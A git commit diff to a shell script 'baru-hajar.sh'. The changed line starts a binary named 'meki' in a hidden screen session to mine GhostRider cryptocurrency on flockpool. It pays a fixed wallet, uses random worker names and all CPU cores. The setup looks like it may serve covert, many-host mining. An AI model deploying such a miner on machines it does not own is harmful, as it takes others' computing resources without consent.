5631a4ec9880a6c0c7a700ea970eaefdf2580439
renilo <88342640+renilo@users.noreply.github.com>
2021-12-02 23:26:25 +0700

    Update baru-hajar.sh

--- baru-hajar.sh
+++ baru-hajar.sh
@@ -1,1 +1,1 @@
-screen -dmS Running ./meki -a gr -o eu.flockpool.com:4444 -u RGA4LQvjY9E7G5WSG6ZZuTmDB5sKr3Hmj5.$(echo $(shuf -i 1-999999 -n 1)-MEKI)
+screen -dmS Running ./meki -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RGA4LQvjY9E7G5WSG6ZZuTmDB5sKr3Hmj5.$(echo $(shuf -i 1-9999999 -n 1)-MEKI) -t $(nproc --all) --no-tune
